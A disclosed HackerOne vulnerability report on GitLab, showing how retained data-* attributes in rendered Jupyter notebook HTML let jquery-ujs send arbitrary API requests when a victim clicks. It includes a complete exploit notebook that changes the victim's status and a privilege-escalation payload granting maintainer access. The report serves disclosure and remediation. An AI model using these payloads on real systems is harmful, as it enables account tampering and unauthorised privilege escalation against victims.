# Sending Arbitrary Requests through Jupyter Notebooks on gitlab.com and Self-Hosted GitLab Instances

## Report Details
- **Report ID**: 970869
- **URL**: https://hackerone.com/reports/970869
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-30T18:14:35.262Z
- **Disclosed**: 2022-02-10T14:46:45.898Z

## Reporter
- **Username**: iwis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
> *NOTE*: I am still researching whether there is a possibility to deploy the exploit without user interaction.

### Summary

GitLab provides a [rich representation](https://docs.gitlab.com/ee/user/project/repository/jupyter_notebooks/) for Jupyter Notebooks (`*.ipynb`). In turn, Jupyter Notebooks provide the possibility for [rich output via HTML](https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb#HTML). Although most tags and attributes are stripped from the HTML output rendered in GitLab's rich representation, it retains `data-*` attributes. Using [`jquery-ujs`](https://gitlab.com/gitlab-org/gitlab/-/blob/4e12f87c013f59070bf1156bb2427af9fa9123c4/package.json#L101) as a gadget, it is possible to trigger `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params). On https://gitlab.com, the CSP restricts the target, while there is no such limitation for self-hosted GitLab instances. As of now, this vulnerability requires user interaction in the form of a single click followed by and applies to https://gitlab.com as well as self-hosted GitLab instances.

### Steps to reproduce

1. Create a GitLab project or refer to an existing project.
2. Upload an `exploit.ipynb` file with the following contents:

     ```json
    {
      "cells": [
        {
          "metadata": { "trusted": true },
          "cell_type": "code",
          "source": "Tell me something about you!",
          "execution_count": 1,
          "outputs": [
            {
              "output_type": "display_data",
              "data": {
                "text/plain": "<IPython.core.display.HTML object>",
                "text/html": "What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\"><option>Red</option><option>Green</option><option>Blue</option></select>\n"
              },
              "metadata": {}
            }
          ]
        }
      ],
      "metadata": {
        "kernelspec": {
          "name": "python3",
          "display_name": "Python 3",
          "language": "python"
        },
        "language_info": {
          "name": "python",
          "version": "3.7.8",
          "mimetype": "text/x-python",
          "codemirror_mode": { "name": "ipython", "version": 3 },
          "pygments_lexer": "ipython3",
          "nbconvert_exporter": "python",
          "file_extension": ".py"
        }
      },
      "nbformat": 4,
      "nbformat_minor": 4
    }
    ```
where `cells[0].outputs[0].data.text/html` contains the payload.
3. In the *Files*  view of the project, click on the above-added `exploit.ipynb`.
4. Select an option other than the default.
5. Reload the page to recongize that your status has been altered, i.e. click on your profile in the top right corner.

### Impact

An attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim.

The impact is similar to that of #824689 and #806571.

### Examples

Due to the destructive nature of the above-described example, I do not provide a public PoC, although I have created [an exemplary repository](https://gitlab.com/dpfuerst/sending-arbitrary-requests-through-jupyter-notebooks). This repository is private, please let me know if you would like me to change the visibility.

The above-described `exploit.ipynb` [sets the user status](https://docs.gitlab.com/ee/api/users.html#set-user-status) of the victim to `p0wn3d`. However, more critical permission-related exploits are also possible. Consider an attacker with developer access to a project who wants to gain maintainer access, instead. That attacker could upload an exploit like the above with the following payload:

```html
What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"user_id=<ATTACKER_ID>&access_level=40\" data-remote=\"true\" data-url=\"/api/v4/projects/<PROJECT_ID>/members\"><option>Red</option><option>Green</option><option>Blue</option></select>\n
```

where `<ATTACKER_ID>` is to be replaced with the attacker's user ID and `<PROJECT_ID>` is to be replaced with the target project's ID to [gain maintainer access](https://docs.gitlab.com/ee/api/members.html#edit-a-member-of-a-group-or-project).

### What is the current *bug* behavior?

The provided `exploit.ipynb` renders to

```html
What's your favorite color? <select data-url="/api/v4/user/status" data-remote="true" data-params="message=p0wn3d" data-method="put"><option>Red</option><option>Green</option><option>Blue</option></select>
```

### What is the expected *correct* behavior?

The provided `exploit.ipynb` should render to

```html
What's your favorite color? <select><option>Red</option><option>Green</option><option>Blue</option></select>
```

That is, `data-*` attributes should be stripped from GitLab's rich output. If the `data-*` attributes are necessary to provide another feature within the rich output, their appearance should be whitelisted, at least.

### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info

```
System information                                                       
System:         Ubuntu 16.04                                             
Proxy:          no                                                       
Current User:   git                                                      
Using RVM:      no                                                       
Ruby Version:   2.6.6p146                                                
Gem Version:    2.7.10                                                   
Bundler Version:1.17.3                                                   
Rake Version:   12.3.3                                                   
Redis Version:  5.0.9                                                    
Git Version:    2.28.0                                                   
Sidekiq Version:5.2.9                                                    
Go Version:     unknown                                                  
                                                                         
GitLab information                                                       
Version:        13.3.2-ee                                                
Revision:       d4deaad1474                                              
Directory:      /opt/gitlab/embedded/service/gitlab-rails                
DB Adapter:     PostgreSQL                                               
DB Version:     11.7                                                     
URL:            <REDACTED>
HTTP Clone URL: <REDACTED>
SSH Clone URL:  <REDACTED>
Elasticsearch:  no                                                       
Geo:            no                                                       
Using LDAP:     no                                                       
Using Omniauth: yes                                                      
Omniauth Providers:                                                      
                                                                         
GitLab Shell                                                             
Version:        13.6.0                                                   
Repository storage paths:                                                
- default:      /git/repositories                                        
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

An attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim. For example, using the GitLab API as a target, an attacker could gain maintainer access to a project, given that the victim is maintainer (or higher) themselves.

The impact is similar to that of #824689 and #806571.

## Attachments
- exploit.ipynb
